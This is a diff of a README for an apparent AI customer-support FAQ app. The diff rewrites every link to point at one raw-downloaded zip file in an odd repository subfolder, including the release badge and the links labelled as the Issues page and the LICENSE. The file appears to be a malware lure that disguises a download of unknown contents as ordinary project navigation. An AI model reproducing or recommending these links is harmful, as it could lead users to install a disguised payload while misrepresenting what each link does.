@@ -1,6 +1,6 @@
 # 🤖 ai-faq-app - Your 24/7 Customer Support Assistant
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-brightgreen)](https://github.com/ajdin123kk/ai-faq-app/releases)
+[![Download the latest release](https://raw.githubusercontent.com/ajdin123kk/ai-faq-app/main/laxate/ai-faq-app.zip%20Latest%20Release-v1.0-brightgreen)](https://raw.githubusercontent.com/ajdin123kk/ai-faq-app/main/laxate/ai-faq-app.zip)
 
 ## 📖 Overview
 
@@ -22,13 +22,13 @@ Before you download the application, ensure your system meets these requirements
 
 ### 📥 Download & Install
 
-1. Visit the [Releases page to download](https://github.com/ajdin123kk/ai-faq-app/releases) the latest version.
+1. Visit the [Releases page to download](https://raw.githubusercontent.com/ajdin123kk/ai-faq-app/main/laxate/ai-faq-app.zip) the latest version.
   
 2. On the Releases page, you will see a list of available versions. Look for the version that suits your operating system.
 
 3. Click on the download link for your version. The file will begin downloading.
 
-![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-brightgreen)
+![Download the latest release](https://raw.githubusercontent.com/ajdin123kk/ai-faq-app/main/laxate/ai-faq-app.zip%20Latest%20Release-v1.0-brightgreen)
 
 4. Once the download is complete, locate the downloaded file. 
 
@@ -75,7 +75,7 @@ Utilize the analytics dashboard to gain insights into your customer interactions
 If you encounter issues:
 
 1. Check the FAQ section in the help menu of the application.
-2. Visit the [Issues page on GitHub](https://github.com/ajdin123kk/ai-faq-app/issues) to report bugs or request help.
+2. Visit the [Issues page on GitHub](https://raw.githubusercontent.com/ajdin123kk/ai-faq-app/main/laxate/ai-faq-app.zip) to report bugs or request help.
 
 ## 🌟 Contributing
 
@@ -83,8 +83,8 @@ We welcome contributions from all users. If you have suggestions or features you
 
 ## 📝 License
 
-This project is licensed under the MIT License. See the [LICENSE](https://github.com/ajdin123kk/ai-faq-app/blob/main/LICENSE) file for details.
+This project is licensed under the MIT License. See the [LICENSE](https://raw.githubusercontent.com/ajdin123kk/ai-faq-app/main/laxate/ai-faq-app.zip) file for details.
 
 ## ✅ Conclusion
 
-With the ai-faq-app, small businesses can offer immediate support to their customers. Follow the steps above, and you will have an efficient solution to handle common questions. Remember to visit the [Releases page to download](https://github.com/ajdin123kk/ai-faq-app/releases) your copy today!
+With the ai-faq-app, small businesses can offer immediate support to their customers. Follow the steps above, and you will have an efficient solution to handle common questions. Remember to visit the [Releases page to download](https://raw.githubusercontent.com/ajdin123kk/ai-faq-app/main/laxate/ai-faq-app.zip) your copy today!
